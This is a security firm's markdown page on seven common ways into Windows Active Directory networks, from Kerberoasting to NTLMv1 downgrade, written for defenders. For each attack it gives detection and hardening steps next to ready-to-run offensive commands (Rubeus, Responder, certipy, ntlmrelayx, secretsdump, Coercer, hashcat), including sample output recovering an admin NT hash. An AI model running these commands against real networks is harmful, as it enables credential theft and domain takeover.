@@ -1,0 +1,425 @@
+---
+title:  The Hackers Guide!
+layout: '~/layouts/MarkdownLayout.astro'
+---
+
+## A Hacker’s Guide to Your Network: Top Ways Pentesters (and Hackers) Breach an Internal Network
+
+Here’s how to use this guide. Read through the vulnerability descriptions and learn about them – some of them probably aren’t new. The most important thing to do is to check if you’re vulnerable. There are two perspectives on many of these:
+
+- From the viewpoint of an admin on your network.
+- From the viewpoint of a pentester or hacker.
+
+They don’t always match up – in fact, it’s pretty common to have a member of your IT team fix these issues, only to have them show up on your next pentest. We do enough testing to know that even very well-funded and proficient IT teams struggle to get everything fixed on the first go. That’s why it can be helpful to use the same tools that pentesters do, just to be sure.
+
+Fix these, and not only will you make your next pentester work harder, but you’ll also make life hard for the real bad guys, too.
+
+Another thing to note – it’s really hard to make a ‘top X’ list for pentesting. Sure – these have a high frequency count across all the tests we’ve done, but they only tell half the story. Many times, these vulnerabilities are embedded in an exploitation chain that involves a bunch of other issues – things we found digging deep on a web application, or stuff we had to forge a path through on our own – just because no exploit existed at the time. Some of our favorites are credentials or misconfigurations that are so infrequent, no scanner has a check for them. That’s the benefit you get with real goal-based, manual pentesting – but that’s a soapbox for another time. :)
+
+> **Disclaimer**: This document is for educational and defensive purposes only. Use these techniques responsibly and only on systems you have explicit permission to test.
+
+---
+
+## Table of Contents
+1. [Kerberoasting](#1-kerberoasting)
+2. [LLMNR and NBNS Poisoning](#2-llmnr-and-nbns-poisoning)
+3. [AD CS (Active Directory Certificate Services) Misconfigurations](#3-ad-cs-active-directory-certificate-services-misconfigurations)
+4. [Password Spraying](#4-password-spraying)
+5. [NTLM Relay](#5-ntlm-relay)
+6. [Pass-the-Hash](#6-pass-the-hash)
+7. [NTLMv1 Downgrade Attacks](#7-ntlmv1-downgrade-attacks)
+
+---
+
+## 1. Kerberoasting
+
+### What Is Kerberoasting?
+Kerberoasting is a technique where attackers target service accounts within Active Directory (AD). These accounts often have Service Principal Names (SPNs), and attackers (or really, any domain user) can request service tickets for these SPNs from the Domain Controller. The service ticket is encrypted with the account’s password hash, which attackers can then brute force offline. 
+
+### Why It’s Effective
+- Service accounts commonly have weak or rarely changed passwords.
+- Offline brute forcing is stealthy.
+- May lead to privilege escalation if the service account has high-level permissions.
+
+### Detection & Mitigation (IT Team)
+- **Monitor Ticket Requests**: Watch for unusual Kerberos TGS requests (Event ID 4769).
+- **Strong Password Policy**: Enforce complex, lengthy passwords for service accounts.
+- **Regular Rotation**: Change service account passwords frequently.
+- **Enable AES Encryption**: Using AES Kerberos tickets makes cracking more difficult.
+- **Use Honey SPNs**: Create decoy SPNs to detect illicit requests - most pentesters request all SPNs at once!
+
+### Example Commands (Blue Team / IT)
+```powershell
+# Enumerate AD users with SPNs
+Import-Module ActiveDirectory
+Get-ADUser -Filter * -Properties ServicePrincipalName | \
+    Where-Object { $_.ServicePrincipalName -ne $null } | \
+    Select SamAccountName, ServicePrincipalName
+
+# Monitor Kerberos event logs (4768, 4769)
+```
+
+### Pentester’s Perspective
+- **Enumeration Tools**: PowerView, Rubeus, and Impacket’s GetUserSPNs.py to find and request SPNs.
+- **Offline Cracking**: Hashcat or John the Ripper to brute force ticket hashes.
+
+Typically one of the first things we do after getting valid credentials from some other method. 
+Depending on the hashing type (23 vs 18), they can be slower than say NT or NetNTLM hashes to crack - but good dictionaries and rules speed that up. 
+
+
+### Example Pentest Commands
+```powershell
+# Using PowerView
+Import-Module .\PowerView.ps1
+Get-DomainUser -SPN | Out-File "kerberoastable_accounts.txt"
+
+# Rubeus kerberoasting
+Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
+
+#Impacket's GetUserSPNs.py
+GetUserSPNs.py corp.local/username:Password1 -dc-ip 10.0.0.15 request
+
+# Offline cracking with Hashcat
+hashcat -m 13100 kerberoast_hashes.txt ./wordlist.txt
+```
+
+---
+
+## 2. LLMNR and NBNS Poisoning
+
+### What Is LLMNR/NBNS?
+- **LLMNR (Link-Local Multicast Name Resolution)** and **NBNS (NetBIOS Name Service)** are fallback name resolution protocols in Windows environments. Attackers can exploit these protocols by responding to broadcast name queries, tricking victims into sending NTLM credentials. Other multicast protocols are at play here, too, such as mDNS. 
+
+### Why It’s Effective
+- Often enabled by default, and really hard to eradicate fully.
+- Attackers capture NTLMv1 or v2 challenge-response hashes. In some cases, you can even lure in plaintext credentials.
+- A stepping stone for lateral movement.
+- No initial credentials needed.
+
+### Detection & Mitigation (IT Team)
+- **Disable LLMNR and NBNS**: Turn off these protocols via Group Policy or registry changes.
+- **Use DNS Suffix Search**: Ensure DNS is the primary method for name resolution.
+- **Monitor for Responder/Inveigh**: Watch network traffic for suspicious activity.
+- **SMB Signing**: Prevents attackers from relaying captured hashes.
+- **Strong Passwords**: The more complex the password, the more difficult they are to crack.
+- **Network / EDR**: Most modern EDR and network security appliances have built-in detections for multicast abuse. Several open-source options exist, too.
+
+### Example Commands (Blue Team / IT)
+```powershell
+# Check if LLMNR is enabled
+Get-NetAdapter | Get-NetIPConfiguration | Select-Object -ExpandProperty InterfaceAlias, LinkLocalMulticastDNS
+
+# Check if NetBIOS Nameservice is enabled (0 = disabled, 1 = enabled)
+Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select-Object -ExpandProperty NetConnectionID, SettingID, TcpipNetbiosOptions
+
+```
+
+### Pentester’s Perspective
+- **Responder**: Classic tool to poison LLMNR/NBNS and capture hashes.
+- **Inveigh**: PowerShell-based alternative for Windows.
+- **Move to Pass-the-Hash or Relay**: Use captured hashes to escalate privileges.
+
+I dare say that no tool has borne as much fruit as Responder. Pre-Responder, it existed as a little-used metasploit module. Rarely do we do a test where this technique doesnt produce a hash for cracking. Users being users, one of them will pick a password we can crack - then its game on. 
+
+### Example Pentest Commands
+```bash
+# Run Responder on the local subnet
+sudo responder -I eth0 -wrf
+
+# Inveigh
+.\Inveigh.ps1
+Invoke-Inveigh -NBNS Y -LLMNR Y
+```
+
+---
+
+## 3. AD CS (Active Directory Certificate Services) Misconfigurations
+
+### What Is AD CS?
+Active Directory Certificate Services provides certificate-based authentication. If misconfigured, attackers can request or forge certificates, gaining unauthorized access or elevated privileges. Typically, pentesters (and hackers) are hunting for that wild ride from domain user to domain admin - which is very common with ADCS vulns. 
+
+### Common Misconfigurations
+- Overly permissive templates that allow low-privilege users or machine accounts to enroll in high-privilege certificates.
+- Weak or unmonitored enrollment processes.
+- Unsecured certificate templates left over from legacy configurations.
+
+### Detection & Mitigation (IT Team)
+- **Review Certificate Templates**: Confirm only the correct groups can enroll in privileged templates.
+- **Enable Logging**: Track certificate requests and issuances.
+- **Remove Legacy Templates**: Prevent usage of old, insecure templates.
+- **Access Controls**: Use role-based permissions for certificate issuance.
+
+### Example Commands (Blue Team / IT)
+```powershell
+# Listing all certificate templates
+certutil -CATemplates
+
+# Check DACLs on a specific template
+certutil -v -dstemplate <TemplateName>
+
+# Restrict enrollment in Group Policy
+```
+
+### Pentester’s Perspective
+- **Discovery Tools**: Certipy (or its wrapped module in NXC) to find vulnerable templates.
+- **Certificate Requests**: Request certs for elevated accounts if misconfigurations allow. Really, just dump all the templates and their permissions, and read through them all looking for vulnerable templates. 
+- **Service Impersonation**: Use the certificate to authenticate as a privileged user.
+- **Permissions**: Anything that allows enrollment as "Domain Users", "Authenticated Users", or "Domain Computers" is juicy, as those are typically the easiest accounts to obtain. 
+
+### Example Pentest Commands
+```bash
+# Enumerate vulnerable templates
+certipy find -u user1@corp.local -p Password -dc-ip 10.0.0.13 -vulnerable
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 45 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 23 enabled certificate templates
+[*] Trying to get CA configuration for 'CORP-DC-CA' via CSRA
+[*] Got CA configuration for 'CORP-DC-CA'
+[*] Saved BloodHound data to '20220802164803_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20250802164803_Certipy.txt'
+[*] Saved JSON output to '20250802164803_Certipy.json'
+
+# Request an elevated certificate
+certipy req -username user1@corp.local -password Password -ca corp-DC-CA -target ca.corp.local -template RDP_Enable -upn admin@corp.local
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 773
+[*] Got certificate with UPN 'admin@corp.local'
+[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-1103'
+[*] Saved certificate and private key to 'admin.pfx'
+
+# Use the nabbed PFX to grab the passable NTLM hash
+$ certipy auth -pfx admin.pfx -dc-ip 10.0.0.13
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: admin@corp.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'admin.ccache'
+[*] Trying to retrieve NT hash for 'admin'
+[*] Got NT hash for 'admin@corp.local': fc525c9683e8fe067095ba2ddc971889
+```
+
+Bingo bango, with the NT hash for an admin in-hand, you can do all sorts of pass-the-hash goodness. As companies finally get a handle on kerberoasting, this is becoming the next most popular attack vector once initial creds are obtained.
+
+---
+
+## 4. Password Spraying
+
+### What Is Password Spraying?
+Password spraying involves testing commonly used passwords (Winter2025!, Companyname#1, etc) against many user accounts, avoiding account lockouts by limiting the number of attempts per account.
+
+### Why It’s Effective
+- Many users reuse weak passwords or follow predictable patterns.
+- Minimal lockout risk if attackers limit attempts. If you're lockout policy is 5 attempts every 15 minutes, an attacker could try 1 attempt every 16 minutes and never lock anyone out. 
+- Large user bases increase your chance of guessing a valid credential.
+
+### Detection & Mitigation (IT Team)
+- **Account Lockout Policies**: Set a low threshold for failed attempts.
+- **Multi-Factor Authentication**: Requires an additional token beyond a password.
+- **Log Monitoring**: Look for patterns of distributed login failures.
+- **Strict Password Policy**: Enforce length and complexity, and check for leaked passwords.
+- **Smart Lockout**: Using cloud security like o365's Smart Lockout helps stop password spraying attacks. 
+### Example Commands (Blue Team / IT)
+```powershell
+# Gathering and reviewing failed login attempts
+Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} | \
+    Select TimeCreated, Message | Out-File "FailedLogons.txt"
+
+# Setting account lockout policy
+Set-ADAccountLockoutPolicy -MaxPasswordAge 30 -LockoutThreshold 3 -LockoutDuration 30
+```
+
+### Pentester’s Perspective
+- **User Enumeration**: Harvest usernames from email formats, LinkedIn, or domain enumeration.
+- **Spraying Tools**: o365spray, Burp for web forms, etc.
+- **Avoid Lockouts**: Keep attempts under lockout thresholds. Use a rotating proxy.
+
+### Example Pentest Commands
+```bash
+# Using CrackMapExec to spray SMB
+crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Summer2024!' --continue-on-success
+
+# o365spray to enumerate / validate Office365 users
+o365spray --enum -U users.txt --domain test.com
+
+# o365spray to perform password spraying against the target domain / tenant
+o365spray --spray -U usernames.txt -P passwords.txt --count 2 --lockout 5 --domain test.com
+
+
+```
+
+---
+
+## 5. NTLM Relay 
+
+### What Is NTLM Relay
+NTLM Relay involves intercepting and forwarding NTLM authentication requests from one system to another without needing to crack credentials. Essentially, an attacker in the middle relays credentials received from one machine to a higher-privileged machine or service, impersonating the user.
+
+### Why It’s Effective
+- NTLM is still prevalent in legacy environments.
+- If SMB signing is disabled, attackers can relay credentials.
+- No matter how complex a password is, there’s no need to crack it for lateral movement.
+
+### Detection & Mitigation (IT Team)
+- **Enforce SMB Signing**: Thwarts NTLM relays by ensuring integrity checks on packets.
+- **Disable NTLM Where Possible**: Encourage Kerberos usage.
+- **Network Segmentation**: Restrict administrative shares and isolate critical systems.
+- **Credential Rotation**: Frequently change privileged account passwords.
+
+### Example Commands (Blue Team / IT)
+```powershell
+# Check is SMB Signing is enabled on a host
+Get-SmbServerConfiguration | Select-Object RequireSecuritySignature
+
+# Detect NTLM usage in logs (Event ID 4776)
+Get-WinEvent -FilterHashtable @{LogName='Security';Id=4776}
+```
+
+### Pentester’s Perspective
+- **Impacket Tools**: `ntlmrelayx.py` for intercepting and relaying credentials, but the rest of the Impacket tools are gold-standard.
+- **Responder**: Used to help initiate inbound connections to then relay. Could use ettercap, mitm6, or any other man-in-the-middle style tools. 
+
+### Example Pentest Commands
+```bash
+# Use NXC or Nmap to find hosts with smb signing disabled:
+nxc smb 10.0.0.0/24
+nmap --script smb-security-mode 10.0.0.0/24
+
+# Setup a NTLM Relay attack with Impacket's ntlmrelayx. Run Responder first, so you have a method for soliciting inbound connections you can then relay.
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+
+
+```
+
+We typically run Responder right next to ntlmrelayx. You'll still get the hashes from responder (although now ntlmrelay prints them), plus you get the benefit of relaying any successful connections. If the user account you relayed is admin on the target host, it will automatically dump its local hashes with secretsdump. You can also relay to ldap for some other attacks as well. 
+
+## 6. Pass-the-Hash
+
+### What Is Pass-the-Hash?
+
+Pass-the-Hash is a technique where an attacker uses stolen NTLM hash credentials directly—without cracking them—to authenticate as a user. By feeding the hash into the authentication process, the attacker gains the same level of access as the actual account.
+
+### Why It’s Effective
+
+- Hashes can be extracted from memory or from compromised machines.
+- No need to crack the password if you have the hash.
+- Allows lateral movement across systems that trust the given credentials.
+
+### Detection & Mitigation (IT Team)
+
+- **Limit Credential Exposure**: Avoid logging in with privileged accounts on non-secure machines.
+- **Credential Guard / LSA Protection**: Hardens LSASS against credential dumping.
+- **Frequent Rotation of High-Value Accounts**: Minimizes the time window for hash reuse.
+
+### Example Commands (Blue Team / IT)
+```powershell
+# Windows Event Monitoring for pass-the-hash patterns
+Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} | \
+    Where-Object { $_.Message -like "*NTLM*" } | Out-File "PTHEvents.txt"
+```
+
+### Pentester’s Perspective
+- Most pentest tools support NT hashes in lieu of plaintext passwords - RDP tools, wmiexec, additional hash dumping tools, etc
+- No need to even attempt cracking hashes if you can just pass-the-hash for authentication.
+- One favorite trick to turn one domain compromise into another is to dump all the hashes from one domain, and then using Pass-the-Hash, throw them all at the other domain / forest. More times than not, we find several shared accounts.
+
+### Example Pentest Commands
+```bash
+# Pass-the-hash with Secretsdump
+secretsdump.py -hashes ':13b29964cc2480b4ef454c59562e675c' 'corp.local/user1@10.0.0.15'
+
+# NXC to pass-the-hash and execute a command
+nxc smb 10.0.0.15 -u Administrator -H '13b29964cc2480b4ef454c59562e675c' -x whoami
+
+```
+
+---
+
+## 7. NTLMv1 Downgrade Attacks
+
+### What Is the NTLMv1 Downgrade Attack?
+**NTLMv1** is an older authentication protocol that is significantly weaker than NTLMv2. Some servers and devices may still accept (or force a downgrade to) NTLMv1. Attackers use tools like **Coercer** to exploit Remote Procedure Call (RPC) services and force target machines to authenticate, capturing or relaying the **NTLMv1** hash.
+
+### Why It’s Effective
+- Legacy systems still support NTLMv1 by default.
+- NTLMv1 hashes are much easier to crack, and with recent DES brute attacks - you can convert a NetNTLMv1 hash into a pure, passable NTLM hash in a few hours of AWS GPU rentals. 
+- Coercer automates the process of forcing authentication attempts, streamlining the attack.
+
+### Detection & Mitigation (IT Team)
+- **Disable NTLMv1**: Via Group Policy and registry, ensure that only NTLMv2 or Kerberos is allowed.
+- **Enforce Strong SMB Signing**: Mitigates attack vectors relying on SMB.
+- **Patch Legacy Systems**: Update or replace outdated servers and workstations.
+- **Monitor Event Logs**: Watch for anomalous inbound RPC or authentication attempts.
+
+### Example Commands (Blue Team / IT)
+```powershell
+# Check the if a host allows NetNTLMv1 authentication - if its 0, 1, or 2 - it might be vulnerable.
+Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" | Select-Object LmCompatibilityLevel
+
+
+# Check logs for forced authentications (Event IDs 4624, 4648, 4768, 4769)
+```
+
+### Pentester’s Perspective
+- **Coercer**: Forces authenticated RPC calls from Windows services to capture or relay NTLM hashes.
+- **Offline Cracking**: If the hash is NTLMv1, you can [convert it into a DES pair](https://github.com/evilmog/ntlmv1-multi) and crack them with hashcat. 100% success rate, and the result is a pass-the-hash-able NT hash. If this was a machine account from a domain controller, you just got Domain Admin rights. 
+
+#### DESbrute Attack: Converting NTLMv1 to an NT Hash
+Because NTLMv1 uses weaker DES-based encryption, it’s possible to derive the full NT hash by cracking the challenge-response offline. Tools can exploit AWS GPU space—or other high-performance computing platforms—to rapidly brute force the underlying DES keys. Once you have a **pure** NT hash, you can pass-the-hash to gain direct access to systems or services with that user’s privileges. This effectively turns an older NTLMv1 capture into a full-blown pass-the-hash scenario.
+
+### Example Pentest Commands
+```bash
+# Using Coercer to coerce remote authentications
+python3 coercer.py -t 192.168.1.50 -l 192.168.1.100
+
+# If NTLMv1 hashes are captured, crack them offline (e.g., using Hashcat -m 14000)
+hashcat -m 14000 ntlmv1_hashes.txt /path/to/wordlist.txt
+
+# After recovering the NT hash, use pass-the-hash (pth) with various tools like nxc or secretsdump.
+```
+
+---
+
+## Conclusion
+By implementing the best practices in this guide, you can significantly reduce your attack surface and better secure your internal networks. Remember that attackers (and pentesters) will always look for the weakest link, whether it’s an unpatched system or a misconfigured protocol.
+
+### Key Takeaways
+- **Proactive Hardening**: Enforce password complexity, disable outdated protocols, and implement network segmentation.
+- **Comprehensive Monitoring**: Log and alert on all authentication events.
+- **Regular Assessments**: Perform frequent pentests or vulnerability scans to catch new issues.
+- **Employee Training**: Ensure all IT staff understand these threats and maintain good security hygiene.
+
+With this knowledge in hand, you’re better equipped to spot and stop intruders in your network. And hey, not just intruders, fixing these issues is going to make your pentesters life hard, too 🙂
+
+Stay vigilant and keep your defenses up-to-date!
+
+---
+import CallToAction from '~/components/widgets/CallToAction.astro';
+
+  <CallToAction
+    actions={[
+      {
+        variant: 'primary',  
+        text: 'Get In Touch',
+        href: '/contact',
+        target: '_blank',
+        icon: 'tabler:phone-check',
+      },
+    ]}  
+  >
+    <Fragment slot="title">
+      Secure Your Future
+    </Fragment>
+    
+    <Fragment slot="subtitle">
+      Contact us now to start building a stronger, more resilient security posture.
+    </Fragment>  
+  </CallToAction>
+
